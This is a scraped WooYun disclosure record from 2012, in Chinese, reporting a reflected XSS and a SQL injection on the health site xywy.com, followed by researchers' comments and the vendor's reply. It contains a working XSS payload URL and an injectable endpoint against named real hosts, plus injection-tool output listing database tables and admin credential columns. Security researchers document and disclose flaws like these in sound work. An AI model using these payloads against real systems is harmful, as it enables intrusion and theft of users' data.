{"id": 19830, "wybug_id": "wooyun-2012-07938", "wybug_title": "寻医问药sql注射致存在安全隐患（部分明文存储）", "wybug_corp": "寻医问药", "wybug_author": "zeracker", "wybug_date": "2012-06-06 13:00", "wybug_open_date": "2012-06-11 13:01", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "反射型", "用户敏感信息泄漏", "明文密码"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 首先为什么要评18分呢？因为是看站点来的。剑心，你就别说俺了。希望国内能够重视乌云，重视安全，重视白帽子！详情请见说明。 详细说明：  XSS跨站\nhttp://club.xywy.com/zjzx/?type=list&cq=%22%3E%3Cscript%3Ealert%280604795%29%3B%3C/script%3E\n注射漏洞：\nhttp://c1.xywy.com/huodong/yspx/medal_team.php?id=326\n\nAnalyzing http://c1.xywy.com/huodong/yspx/medal_team.php?id=326Host IP: 115.182.68.232Web Server: XT-server/0.0Powered-by: PHP/5.2.14p1Can not find keyword but let me do a try!I guess injection type is Integer?! If injection failed, retry with a manual keyword.Can't find db server type! But maybe there be some chances! [-o<Selected Column Count is 6Valid String Column is 1DB Server: MySQLCurrent DB: clubCount(table_name) of information_schema.tables where table_schema=0x636C7562 is 344Can not get all tables by group_concat!Count(table_name) of information_schema.tables where table_schema=0x636C7562 is 344Canceling...Job Canceled!Data Base Found: information_schemaData Base Found: clubData Base Found: new_clubCount(table_name) of information_schema.tables where table_schema=0x6E65775F636C7562 is 0Table found: active_manageCount(column_name) of information_schema.columns where table_schema=0x6E65775F636C7562 and table_name=0x6163746976655F6D616E616765 is 0Column found: idCount(table_name) of information_schema.tables where table_schema=0x636C7562 is 344Table found: 111_doctor_stats_tempTable found: 111_questionTable found: 111_question_detailTable found: 111_replyTable found: 111_tmpTable found: 111_tmpdirTable found: BoxItemTable found: TopBoxTable found: acceptelecTable found: act_eggTable found: act_egg_backTable found: act_egg_cardTable found: act_egg_tmpTable found: active_manageTable found: admin_funTable found: admin_fun_newTable found: admin_groupTable found: admin_group_fun_newTable found: admin_group_newTable found: admin_logTable found: admin_userTable found: admin_user_funTable found: admin_user_logTable found: admin_user_newTable found: admin_user_postTable found: admin_user_post_bakTable found: admin_user_statusTable found: agree_count_dataTable found: articleTable found: attention_numTable found: audit_time_setTable found: baidu_questionTable found: baidu_question_tempTable found: bak_20120523_questionTable found: bak_20120523_question_detailTable found: bak_20120523_question_picTable found: bak_20120523_replyTable found: banzhu_job_statTable found: bbs_topicTable found: bbsconfigTable found: blog_clickTable found: blog_commendTable found: blog_commonTable found: blog_replyTable found: blog_sortTable found: blog_uTable found: boxitemTable found: business_clubTable found: ceng_click_countTable found: chat_log_pigeonholeTable found: chat_statisticsTable found: chatdoctorlistTable found: chatinfoTable found: chatlistTable found: chattempTable found: choose_tempTable found: chunjie_huodongTable found: chunjie_huojiangTable found: commendTable found: commend_detailTable found: commend_detail_tempTable found: commend_doctorTable found: commend_doctor_newTable found: confident_tempTable found: count_sendrecordTable found: count_sendrecord_tmpTable found: date_noticeTable found: del_dataTable found: deluserTable found: depart_rightTable found: dialogTable found: doc_tp_dayTable found: doc_tp_monthTable found: doc_tp_tempTable found: doc_tp_weekTable found: doctor_cardTable found: doctor_card_assignTable found: doctor_handleTable found: doctor_medal_spreadTable found: doctor_statTable found: doctor_stat_20110923Table found: doctor_stat_20110927Table found: doctor_stat_20110930Table found: doctor_stat_20111208Table found: doctor_stat_20120101Table found: doctor_stat_20120102Table found: doctor_stat_20120114Table found: doctor_stat_20120125Table found: doctor_stat_20120406Table found: doctor_stat_20120422mTable found: doctor_stat_bak20120221Table found: doctor_stat_maliuTable found: doctor_stat_maliu_bakTable found: doctor_stat_monthTable found: doctor_stat_month_0523Table found: doctor_stat_month_0601Table found: doctor_stat_month_0602Table found: doctor_stat_month_0603Table found: doctor_stat_month_bakTable found: doctor_stat_oldTable found: doctor_stats_backupTable found: doctor_stats_tempTable found: doctor_stats_temp_20120422mTable found: doctor_subjectTable found: exchangeTable found: expert_onlineTable found: expert_online_timeTable found: extend_keywordTable found: favor_docTable found: favor_drugTable found: favor_drug_shopTable found: favor_hospitalTable found: favor_jbillTable found: favoriteTable found: favorite_folderTable found: fill_keywordTable found: fill_keyword_0606Table found: fill_keyword_delTable found: fill_keyword_lockTable found: fill_keywords_skipTable found: fill_questionTable found: fill_question_bakTable found: filter_detailTable found: filter_notifyTable found: filter_questionTable found: friendTable found: getbbs_pointTable found: heath_awokeTable found: home_countTable found: home_guide_countTable found: hospital_doc_linkTable found: hospital_questionTable found: hospital_question_tempTable found: hot_infomationTable found: huodong2008Table found: huodong_2011Table found: id_keywordTable found: ill_to_subjectTable found: index_adminTable found: index_cengTable found: invite_friendTable found: ip_denyTable found: jfsc_classTable found: jfsc_class_20110929Table found: jfsc_exchangeTable found: jfsc_exchange_detailTable found: jfsc_productTable found: jfsc_proimgTable found: josso_roleTable found: josso_user_propertyTable found: josso_user_roleTable found: keywordTable found: keyword_adTable found: keyword_ad_newTable found: keyword_ad_userTable found: keyword_denyTable found: keyword_deny_bakTable found: keyword_deny_tmpTable found: keyword_iniTable found: messageTable found: messageoldTable found: new_doctor_commendTable found: pointTable found: point22Table found: point_20111008Table found: point_processTable found: point_process_backup20091221Table found: point_process_bakTable found: point_process_testTable found: point_tempTable found: point_tmpTable found: presendTable found: productTable found: proxy_client_apiTable found: qq_groupTable found: que_agree_countTable found: ques_zjtTable found: questionTable found: question091101Table found: question091101_attachTable found: question091101_detailTable found: question091101_picTable found: question091101_replyTable found: question100501Table found: question100501_attachTable found: question100501_detailTable found: question100501_picTable found: question100501_replyTable found: question101001Table found: question101001_attachTable found: question101001_detailTable found: question101001_picTable found: question101001_replyTable found: question110201Table found: question110201_attachTable found: question110201_detailTable found: question110201_picTable found: question110201_replyTable found: question110719Table found: question110719_attachTable found: question110719_detailTable found: question110719_picTable found: question110719_replyTable found: question110814Table found: question110814_attachTable found: question110814_detailTable found: question110814_picTable found: question110814_replyTable found: question110922Table found: question110922_attachTable found: question110922_detailTable found: question110922_picTable found: question110922_replyTable found: question111202Table found: question111202_attachTable found: question111202_detailTable found: question111202_picTable found: question111202_replyTable found: question120202Table found: question120202_attachTable found: question120202_detailTable found: question120202_picTable found: question120202_replyTable found: question120523Table found: question120523_attachTable found: question120523_detailTable found: question120523_picTable found: question120523_replyTable found: question_0814_bakTable found: question_20110916Table found: question_attachTable found: question_attach_oldTable found: question_attach_tmpTable found: question_broadcastTable found: question_delTable found: question_del_stat_backupTable found: question_del_stat_tempTable found: question_detailTable found: question_detail_0814_bakTable found: question_detail_newTable found: question_detail_tmp_bakTable found: question_eliteTable found: question_elite_tempTable found: question_fristpageTable found: question_hos_docTable found: question_hos_doc_tmpTable found: question_jibTable found: question_newTable found: question_passTable found: question_picTable found: question_pic_0814_bakTable found: question_pic_newTable found: question_pic_tmp_bakTable found: question_recycleTable found: question_reply_lockTable found: question_reply_timeTable found: question_shortmsg_setTable found: question_tempTable found: question_tmp_bakTable found: question_total_dayTable found: question_total_subjectTable found: question_total_subject_comebackTable found: question_total_tmpTable found: questionoldTable found: questionold090228Table found: questionold090228_attachTable found: questionold090228_detailTable found: questionold090228_picTable found: questionold090228_replyTable found: questionold_attachTable found: questionold_detailTable found: questionold_picTable found: questionold_replyTable found: quick_questionTable found: range_keywordsTable found: rational_to_questionTable found: receive_msgTable found: record_spaceTable found: replyTable found: reply_0814_bakTable found: reply_201205211251Table found: reply_del_tempTable found: reply_newTable found: reply_recycleTable found: reply_taolunTable found: reply_taolun_194Table found: reply_tempTable found: reply_tmp_bakTable found: search_historyTable found: search_keywordTable found: search_keyword_sellTable found: search_keyword_sell_preTable found: search_questionTable found: search_question_xgTable found: send_emailTable found: shortmsg_infoTable found: shortmsg_send_countTable found: sina_userTable found: soft_offonTable found: soft_rTable found: subject_ownerTable found: subyqljTable found: system_msg_readruserTable found: tag_keywordTable found: tmp_hospitalTable found: tmpppTable found: topboxTable found: topics_actionsTable found: tousuTable found: user_act_emailTable found: user_actionTable found: user_action_20110908Table found: user_action_20120502Table found: user_action_replyTable found: user_albumTable found: user_album_folderTable found: user_attentionTable found: user_blogTable found: user_blog_bakTable found: user_blog_kindTable found: user_callinTable found: user_common_infoTable found: user_common_newTable found: user_doctor_infoTable found: user_doctor_newTable found: user_doctor_reply_tuanTable found: user_jobTable found: user_link_rrTable found: user_newTable found: user_settingTable found: user_setting_backTable found: user_timeTable found: user_work_infoTable found: user_youke_newTable found: wb_addressTable found: wb_answer_logTable found: wb_cardTable found: wb_faveriteTable found: wb_get_faverite_logTable found: whx_testTable found: youjiangdiaochaTable found: youjiangdiaocha_peopleTable found: youjiangdiaocha_tongjiTable found: zhaopinCount(column_name) of information_schema.columns where table_schema=0x636C7562 and table_name=0x61646D696E5F75736572 is 7Column found: idColumn found: pidColumn found: usernameColumn found: passwdColumn found: createtimeColumn found: subjectColumn found: userid\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  加强安全体系！！！树立安全意识！   版权声明：转载请注明来源 zeracker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-06-11 13:01 厂商回复：  最新状态： 2012-06-11：多谢提醒了～  ", "replys": "漏洞评价：\n评论\n     2012-06-06 13:16 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  哥们 /corp_detail.php?corp=%E5%AF%BB%E5%8C%BB%E9%97%AE%E8%8D%AF 我不会确认的    \n     2012-06-06 13:17 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @_Evil 这个是什么？    \n     2012-06-06 13:18 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @zeracker 这个厂家没确认过漏洞    \n     2012-06-06 13:26 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  看到这个 WooYun: 寻医问药分站存在SQL注射漏洞、弱口令及使用了存在漏洞的编辑器  ，3rank，你会伤心的～     \n     2012-06-06 13:27 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @_Evil @gainover 伤心没用的，剑心都不出来帮忙力挺，失望。。他公开我这个，就会死的。。你懂的。    \n     2012-06-06 13:29 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  公开倒不会吧～ 这个厂家还是会确认漏洞的， 已公开 的那些都是确认的。 只是给的rank挺低～～    \n     2012-06-06 13:32 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  rank能当饭吃吗？    \n     2012-06-06 13:34 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @momo 能。    \n     2012-06-06 13:37 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  @zeracker 对你这个2，我很无语的。    \n     2012-06-06 13:43 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @momo 注意语言表达  -_-||||| 这里是公众场合    \n     2012-06-06 15:00 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @momo 这个世界里，不公平的地方太多了，总会有很多人付出了，得不到应有的回报。rank说起来是不值什么，也不能兑换成money，也不能拿来泡妹子。 但有些事情总是需要有人去做的，虽然很多人没有得到厂商的肯定和尊重。不论哪个行业，总是存在那么一批，因为兴趣而热爱，而不是因为利益而入魔的群体。 “WooYun将一切对安全极为感兴趣，对事物运行的原理有着天生的好奇心，愿意将技术回归技术，愿意为其他朋友做出贡献的人定义为白帽子”，从乌云对白帽子的定义看来，亦如此，“兴趣”才是落脚点。 如果大家是为利益来的，还呆乌云做什么呢？  如果什么都以“利益”为优先，乌云也就不存在了，为乌云的建设付出努力的那些人，又凭什么拿出自己的时间去为大家建设者们一个平台呢？黑与白是2个并行，且相辅相成的世界，所以个人认为，不应该以自己的世界观对别人加以评判。     \n     2012-06-06 15:02 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @gainover 哥们好样的    \n     2012-06-06 16:00 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  有些厂商rank给的很不靠谱诶，还是要多去大公司挖啊，rank靠谱有时候还有礼物。看看这个，要了5rank，才给了1rank，你会伤心的。。 WooYun: 寻医问药提问XSS    \n     2012-06-06 16:31 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @px1624 一个xss一分。这个危害就不用说了。    \n     2012-06-06 16:34 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  @gainover 301是我朋友，不然也不会和他开玩笑，你真闲。你好伟大啊。    \n     2012-06-06 16:55 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @momo 你真够无语的。让别人怎么看。— —    \n     2012-06-06 17:13 |    \t\t小禾吉 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 宇宙的目的很可能和人类没有关系，宇宙很可...)\t\t \n  @momo 有些人开玩笑 有些人认真 矛盾就产生了~    \n     2012-06-06 17:18 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  @小禾吉 所以，社会上，闲的人很多啊。    \n     2012-06-06 18:02 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @小禾吉 @momo ，闲是蛮闲的，伟大这个词，如果能用在我身上，我早就带领劳苦大众翻身做主人了。。哈哈。  -- 我确实是站在一个“非玩笑”的角度来思考这个问题，虽然momo只是一句玩笑话，但是这句话，不少人也会去想。 至于矛盾，哪有那么容易产生的，矛盾是积累才会有的～     \n     2012-06-06 18:03 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @gainover 呵呵。他嘴巴就是这样子的。木事。谢谢G哥关心。    \n     2012-06-06 18:23 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  矛盾？。。。这个帖子能得多少rank貌似已经被无视了。。。    \n     2012-06-06 18:39 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  寻医问药的漏洞太多了。。。大哥们就别挖了。。对方也不重视的    \n     2012-06-06 18:41 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n   俺只是顺手看到。    \n     2012-06-06 18:54 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  We are whitehats    \n     2012-06-06 21:53 |    \t\tnidao \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:3        | 还是木有。)\t\t \n  我是来看评论的。。。    \n     2012-06-11 13:53 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  哈哈，忽略了。给力。    \n     2012-06-11 14:00 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  哎，看样子又是各种脱库。现在用户的数据真是不值钱。    \n     2012-06-12 00:32 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  2012年6月11日：多谢提醒了~~简直就是个悲剧！！忽略算什么？然后感谢？让用户数据裸奔的企业，不是好企业！    \n     2012-06-12 16:26 |    \t\t寻医问药(乌云厂商)\t\t \n  @zeracker 非常感谢您。漏洞已经修复，明文密码已在修改。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}